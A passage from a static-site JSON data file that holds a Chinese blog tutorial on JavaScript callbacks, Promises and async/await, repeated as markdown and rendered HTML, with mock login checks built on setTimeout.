模拟若已经登录了，再检查是否为合法的用户\n        if (response.code === '10001') {\n            setTimeout(() => {\n                let response2 = {\n                    code: '10001',\n                    data: {\n                        param2: 'abcde'\n                    }\n                };\n                console.log('检查合法请求完成：' + response2);\n                if (response2.code === '10001') {\n                    console.log('callback');\n                    doExportData(response.data.param1, response2.data.param2);\n                }\n\n            }, 500)\n        }\n\n    }, 500)\n}\nexportData();\n// 执行结果\n// 检查登录请求完成：[object Object]\n// 检查合法请求完成：[object Object]\n// callback\n// [export data]param:\"12345\"\n```\n## 示例二：Promise\n```js\n// 执行下载数据\nfunction doExportData(data) {\n    console.log('[export data]param:' + JSON.stringify(data));\n}\n\n\nlet myPromise = new Promise((resolve, reject) => {\n    // 模拟异步请求返回数据\n    setTimeout(() => {\n        let response = {\n            code: '10001',\n            data: {\n                param1: '12345'\n            }\n        };\n        if (response.code === '10001') {\n            resolve(response.data.param1);\n        }\n\n    }, 500)\n});\nmyPromise.then((param1) => {\n    return new Promise((resolve, reject) => {\n        // 模拟异步请求返回数据\n        setTimeout(() => {\n            let response2 = {\n                code: '10001',\n                data: {\n                    param2: 'abcde'\n                }\n            };\n            if (response2.code === '10001') {\n                resolve({ param1: param1, param2: response2.data.param2 });\n            }\n\n        }, 500)\n    })\n}).then((data) => {\n    console.log('promise');\n    doExportData(data.param1, data.param2);\n})\n\n\n// promise\n// [export data]param:\"12345\"\n```\n\n## 示例三：async await\n\n```js\n// 执行下载数据\nfunction doExportData(data) {\n    console.log('[export data]param:' + JSON.stringify(data));\n}\n\nfunction ajax1() {\n    return new Promise((resolve, reject) => {\n        setTimeout(() => {\n            let response = {\n                code: '10001',\n                data: {\n                    param: '12345'\n                }\n            };\n            // let response = {\n            //     code: '10002',\n            //     data: {\n            //         param: 'ajax1 error'\n            //     }\n            // };\n            if (response.code === '10001') {\n                resolve(response.data);\n            } else {\n                reject(response.data);\n            }\n\n        }, 500)\n    })\n\n}\n\nfunction ajax2(data1) {\n    return new Promise((resolve, reject) => {\n        setTimeout(() => {\n            let response = {\n                code: '10001',\n                data: {\n                    param: 'abcde'\n                }\n            };\n            // let response = {\n            //     code: '10002',\n            //     data: {\n            //         param: 'ajax2 error'\n            //     }\n            // };\n            if (response.code === '10001') {\n                resolve({ param1: data1.param, param2: response.data.param });\n            } else {\n                reject(response.data);\n            }\n        }, 500)\n    })\n\n}\n\nasync function exportData(params) {\n    try {\n        let data1 = await ajax1();\n        let data = await ajax2(data1);\n        console.log('async await');\n        doExportData(data);\n    } catch (error) {\n        console.log(error);\n    }\n\n}\nexportData();\n\n// async await\n// [export data]param:{\"param1\":\"12345\",\"param2\":\"abcde\"}\n```\n\n其实async await只是promise的魔法糖，例如示例三可调整为如下：\n```js\nlet myPromise = ajax1();\nmyPromise.then((data1) => {\n    return ajax2(data1);\n}).then((data) => {\n    console.log('promise');\n    doExportData(data);\n})\n\n// promise\n// [export data]param:{\"param1\":\"12345\",\"param2\":\"abcde\"}\n```\n\n# 后记\n其实promise也只是对回调函数进行的包装，通过观察者模式实现形式上的同步代码，需要深入研究的请参阅[Promise原理与实现](https://www.jianshu.com/p/b4f0425b22a1)。","source":"_posts/2019/03/2019-03-02-异步之回调-promise-async-await.md","raw":"---\ntitle: '异步之回调,promise,async/await'\ntags:\n  - JavaScript\ncategories:\n  - 前端\ndate: 2019-03-02 16:19:52\nupdated: 2019-03-02 16:19:52\n---\n# 前言\n场景：点击按钮下载商品数据。涉及到异步账户检查，首先有没有登录，如果登录了，再检查是否是合法用户，\b如果是合法的那么继续下面操作。\n# 概述\n在JavaScript中处理异步请求是用的回调函数，对于需要顺序处理异步请求的，就得一层层嵌套回调，层数多了就很难维护了，就是大家说的“回调地狱”，怎么才能像同步代码那样优雅的写呢？这就是ES6的promise及ES7的async/await要解决的问题。\n<!-- more -->\n# 详述\n\n## 示例一：回调函数\n```js\n// 执行下载数据\nfunction doExportData(data) {\n    console.log('[export data]param:' + JSON.stringify(data));\n}\n\nfunction exportData() {\n    // 模拟ajax检查是否登录\n    setTimeout(() => {\n        let response = {\n            code: '10001',\n            data: {\n                param1: '12345'\n            }\n        };\n        console.log('检查登录请求完成：' + response);\n        // 模拟若已经登录了，再检查是否为合法的用户\n        if (response.code === '10001') {\n            setTimeout(() => {\n                let response2 = {\n                    code: '10001',\n                    data: {\n                        param2: 'abcde'\n                    }\n                };\n                console.log('检查合法请求完成：' + response2);\n                if (response2.code === '10001') {\n                    console.log('callback');\n                    doExportData(response.data.param1, response2.data.param2);\n                }\n\n            }, 500)\n        }\n\n    }, 500)\n}\nexportData();\n// 执行结果\n// 检查登录请求完成：[object Object]\n// 检查合法请求完成：[object Object]\n// callback\n// [export data]param:\"12345\"\n```\n## 示例二：Promise\n```js\n// 执行下载数据\nfunction doExportData(data) {\n    console.log('[export data]param:' + JSON.stringify(data));\n}\n\n\nlet myPromise = new Promise((resolve, reject) => {\n    // 模拟异步请求返回数据\n    setTimeout(() => {\n        let response = {\n            code: '10001',\n            data: {\n                param1: '12345'\n            }\n        };\n        if (response.code === '10001') {\n            resolve(response.data.param1);\n        }\n\n    }, 500)\n});\nmyPromise.then((param1) => {\n    return new Promise((resolve, reject) => {\n        // 模拟异步请求返回数据\n        setTimeout(() => {\n            let response2 = {\n                code: '10001',\n                data: {\n                    param2: 'abcde'\n                }\n            };\n            if (response2.code === '10001') {\n                resolve({ param1: param1, param2: response2.data.param2 });\n            }\n\n        }, 500)\n    })\n}).then((data) => {\n    console.log('promise');\n    doExportData(data.param1, data.param2);\n})\n\n\n// promise\n// [export data]param:\"12345\"\n```\n\n## 示例三：async await\n\n```js\n// 执行下载数据\nfunction doExportData(data) {\n    console.log('[export data]param:' + JSON.stringify(data));\n}\n\nfunction ajax1() {\n    return new Promise((resolve, reject) => {\n        setTimeout(() => {\n            let response = {\n                code: '10001',\n                data: {\n                    param: '12345'\n                }\n            };\n            // let response = {\n            //     code: '10002',\n            //     data: {\n            //         param: 'ajax1 error'\n            //     }\n            // };\n            if (response.code === '10001') {\n                resolve(response.data);\n            } else {\n                reject(response.data);\n            }\n\n        }, 500)\n    })\n\n}\n\nfunction ajax2(data1) {\n    return new Promise((resolve, reject) => {\n        setTimeout(() => {\n            let response = {\n                code: '10001',\n                data: {\n                    param: 'abcde'\n                }\n            };\n            // let response = {\n            //     code: '10002',\n            //     data: {\n            //         param: 'ajax2 error'\n            //     }\n            // };\n            if (response.code === '10001') {\n                resolve({ param1: data1.param, param2: response.data.param });\n            } else {\n                reject(response.data);\n            }\n        }, 500)\n    })\n\n}\n\nasync function exportData(params) {\n    try {\n        let data1 = await ajax1();\n        let data = await ajax2(data1);\n        console.log('async await');\n        doExportData(data);\n    } catch (error) {\n        console.log(error);\n    }\n\n}\nexportData();\n\n// async await\n// [export data]param:{\"param1\":\"12345\",\"param2\":\"abcde\"}\n```\n\n其实async await只是promise的魔法糖，例如示例三可调整为如下：\n```js\nlet myPromise = ajax1();\nmyPromise.then((data1) => {\n    return ajax2(data1);\n}).then((data) => {\n    console.log('promise');\n    doExportData(data);\n})\n\n// promise\n// [export data]param:{\"param1\":\"12345\",\"param2\":\"abcde\"}\n```\n\n# 后记\n其实promise也只是对回调函数进行的包装，通过观察者模式实现形式上的同步代码，需要深入研究的请参阅[Promise原理与实现](https://www.jianshu.com/p/b4f0425b22a1)。","slug":"2019-03-02-异步之回调-promise-async-await","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8wz004rwovv584taqfn","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>场景：点击按钮下载商品数据。涉及到异步账户检查，首先有没有登录，如果登录了，再检查是否是合法用户，\b如果是合法的那么继续下面操作。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>在JavaScript中处理异步请求是用的回调函数，对于需要顺序处理异步请求的，就得一层层嵌套回调，层数多了就很难维护了，就是大家说的“回调地狱”，怎么才能像同步代码那样优雅的写呢？这就是ES6的promise及ES7的async/await要解决的问题。<br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"示例一：回调函数\"><a href=\"#示例一：回调函数\" class=\"headerlink\" title=\"示例一：回调函数\"></a>示例一：回调函数</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 执行下载数据</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doExportData</span>(<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'[export data]param:'</span> + <span class=\"built_in\">JSON</span>.stringify(data));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">exportData</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 模拟ajax检查是否登录</span></span><br><span class=\"line\">    setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> response = &#123;</span><br><span class=\"line\">            code: <span class=\"string\">'10001'</span>,</span><br><span class=\"line\">            data: &#123;</span><br><span class=\"line\">                param1: <span class=\"string\">'12345'</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'检查登录请求完成：'</span> + response);</span><br><span class=\"line\">        <span class=\"comment\">// 模拟若已经登录了，再检查是否为合法的用户</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (response.code === <span class=\"string\">'10001'</span>) &#123;</span><br><span class=\"line\">            setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">let</span> response2 = &#123;</span><br><span class=\"line\">                    code: <span class=\"string\">'10001'</span>,</span><br><span class=\"line\">                    data: &#123;</span><br><span class=\"line\">                        param2: <span class=\"string\">'abcde'</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;;</span><br><span class=\"line\">                <span class=\"built_in\">console</span>.log(<span class=\"string\">'检查合法请求完成：'</span> + response2);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (response2.code === <span class=\"string\">'10001'</span>) &#123;</span><br><span class=\"line\">                    <span class=\"built_in\">console</span>.log(<span class=\"string\">'callback'</span>);</span><br><span class=\"line\">                    doExportData(response.data.param1, response2.data.param2);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;, <span class=\"number\">500</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;, <span class=\"number\">500</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">exportData();</span><br><span class=\"line\"><span class=\"comment\">// 执行结果</span></span><br><span class=\"line\"><span class=\"comment\">// 检查登录请求完成：[object Object]</span></span><br><span class=\"line\"><span class=\"comment\">// 检查合法请求完成：[object Object]</span></span><br><span class=\"line\"><span class=\"comment\">// callback</span></span><br><span class=\"line\"><span class=\"comment\">// [export data]param:\"12345\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"示例二：Promise\"><a href=\"#示例二：Promise\" class=\"headerlink\" title=\"示例二：Promise\"></a>示例二：Promise</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 执行下载数据</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doExportData</span>(<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'[export data]param:'</span> + <span class=\"built_in\">JSON</span>.stringify(data));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> myPromise = <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 模拟异步请求返回数据</span></span><br><span class=\"line\">    setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> response = &#123;</span><br><span class=\"line\">            code: <span class=\"string\">'10001'</span>,</span><br><span class=\"line\">            data: &#123;</span><br><span class=\"line\">                param1: <span class=\"string\">'12345'</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (response.code === <span class=\"string\">'10001'</span>) &#123;</span><br><span class=\"line\">            resolve(response.data.param1);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;, <span class=\"number\">500</span>)</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">myPromise.then(<span class=\"function\">(<span class=\"params\">param1</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 模拟异步请求返回数据</span></span><br><span class=\"line\">        setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> response2 = &#123;</span><br><span class=\"line\">                code: <span class=\"string\">'10001'</span>,</span><br><span class=\"line\">                data: &#123;</span><br><span class=\"line\">                    param2: <span class=\"string\">'abcde'</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (response2.code === <span class=\"string\">'10001'</span>) &#123;</span><br><span class=\"line\">                resolve(&#123; <span class=\"attr\">param1</span>: param1, <span class=\"attr\">param2</span>: response2.data.param2 &#125;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;, <span class=\"number\">500</span>)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;).then(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'promise'</span>);</span><br><span class=\"line\">    doExportData(data.param1, data.param2);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// promise</span></span><br><span class=\"line\"><span class=\"comment\">// [export data]param:\"12345\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"示例三：async-await\"><a href=\"#示例三：async-await\" class=\"headerlink\" title=\"示例三：async await\"></a>示例三：async await</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 执行下载数据</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doExportData</span>(<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'[export data]param:'</span> + <span class=\"built_in\">JSON</span>.stringify(data));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ajax1</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> response = &#123;</span><br><span class=\"line\">                code: <span class=\"string\">'10001'</span>,</span><br><span class=\"line\">                data: &#123;</span><br><span class=\"line\">                    param: <span class=\"string\">'12345'</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;;</span><br><span class=\"line\">            <span class=\"comment\">// let response = &#123;</span></span><br><span class=\"line\">            <span class=\"comment\">//     code: '10002',</span></span><br><span class=\"line\">            <span class=\"comment\">//     data: &#123;</span></span><br><span class=\"line\">            <span class=\"comment\">//         param: 'ajax1 error'</span></span><br><span class=\"line\">            <span class=\"comment\">//     &#125;</span></span><br><span class=\"line\">            <span class=\"comment\">// &#125;;</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (response.code === <span class=\"string\">'10001'</span>) &#123;</span><br><span class=\"line\">                resolve(response.data);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                reject(response.data);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;, <span class=\"number\">500</span>)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ajax2</span>(<span class=\"params\">data1</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> response = &#123;</span><br><span class=\"line\">                code: <span class=\"string\">'10001'</span>,</span><br><span class=\"line\">                data: &#123;</span><br><span class=\"line\">                    param: <span class=\"string\">'abcde'</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;;</span><br><span class=\"line\">            <span class=\"comment\">// let response = &#123;</span></span><br><span class=\"line\">            <span class=\"comment\">//     code: '10002',</span></span><br><span class=\"line\">            <span class=\"comment\">//     data: &#123;</span></span><br><span class=\"line\">            <span class=\"comment\">//         param: 'ajax2 error'</span></span><br><span class=\"line\">            <span class=\"comment\">//     &#125;</span></span><br><span class=\"line\">            <span class=\"comment\">// &#125;;</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (response.code === <span class=\"string\">'10001'</span>) &#123;</span><br><span class=\"line\">                resolve(&#123; <span class=\"attr\">param1</span>: data1.param, <span class=\"attr\">param2</span>: response.data.param &#125;);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                reject(response.data);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;, <span class=\"number\">500</span>)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">exportData</span>(<span class=\"params\">params</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> data1 = <span class=\"keyword\">await</span> ajax1();</span><br><span class=\"line\">        <span class=\"keyword\">let</span> data = <span class=\"keyword\">await</span> ajax2(data1);</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'async await'</span>);</span><br><span class=\"line\">        doExportData(data);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (error) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(error);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">exportData();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// async await</span></span><br><span class=\"line\"><span class=\"comment\">// [export data]param:&#123;\"param1\":\"12345\",\"param2\":\"abcde\"&#125;</span></span><br></pre></td></tr></table></figure>\n<p>其实async await只是promise的魔法糖，例如示例三可调整为如下：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> myPromise = ajax1();</span><br><span class=\"line\">myPromise.then(<span class=\"function\">(<span class=\"params\">data1</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ajax2(data1);</span><br><span class=\"line\">&#125;).then(<span class=\"function\">(<span class=\"params\">data</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'promise'</span>);</span><br><span class=\"line\">    doExportData(data);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// promise</span></span><br><span class=\"line\"><span class=\"comment\">// [export data]param:&#123;\"param1\":\"12345\",\"param2\":\"abcde\"&#125;</span></span><br></pre></td></tr></table></figure></p>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>其实promise也只是对回调函数进行的包装，通过观察者模式实现形式上的同步代码，需要深入研究的请参阅<a href=\"https://www.jianshu.com/p/b4f0425b22a1\" target=\"_blank\" rel=\"noopener\">Promise原理与实现</a>。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>场景：点击按钮下载商品数据。涉及到异步账户检查，首先有没有登录，如果登录了，再检查是否是合法用户，\b如果是合法的那么继续下面操作。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>在JavaScript中处理异步请求是用的回调函数，对于需要顺序处理异步请求的，就得一层层嵌套回调，层数多了就很难维护了，就是大家说的“回调地狱”，怎么才能像同步代码那样优雅的写呢？这就是ES6的promise及ES7的async/await要解决的问题。<br></p>","more":"<p></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"示例一：回调函数\"><a href=\"#示例一：回调函数\" class=\"headerlink\" title=\"示例一：回调函数\"></a>示例一：回调函数</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 执行下载数据</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doExportData</span>(<span class=\"params\">data</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'[export data]param:'</span> + <span class=\"built_in\">JSON</span>.stringify(data));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">exportData</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 模拟ajax检查是否登录</span></span><br><span class=\"line\">    setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> response = &#123;</span><br><span class=\"line\">            code: <span class=\"string\">'10001'</span>,</span><br><span class=\"line\">            data: &#123;</span><br><span class=\"line\">                param1: <span class=\"string\">'12345'</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'检查登录请求完成：'</span> + response);</span><br><span class=\"line\">        <span class=\"comment\">// 模拟若已经登录了，再检查是否为合法的用户</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (response.code === <span class=\"string\">'10001'</span>) &#123;</span><br><span class=\"line\">            setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">let</span> response2 = &#123;</span><br><span class=\"line\">                    code: <span 